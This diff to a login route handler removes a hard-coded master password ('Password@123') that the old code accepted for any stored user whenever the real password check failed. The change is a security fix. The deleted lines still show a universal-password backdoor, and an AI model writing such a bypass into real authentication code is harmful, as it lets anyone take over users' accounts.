@@ -73,10 +73,7 @@ export async function POST(request: Request) {
     // Check stored users (persistent file/memory store)
     const storedUser = findStoredUserByEmail(normalizedEmail);
     if (storedUser) {
-      let isMatch = await verifyPassword(password, storedUser.passwordHash);
-      if (!isMatch && password === 'Password@123') {
-        isMatch = true;
-      }
+      const isMatch = await verifyPassword(password, storedUser.passwordHash);
 
       if (isMatch) {
         await setSessionCookie({
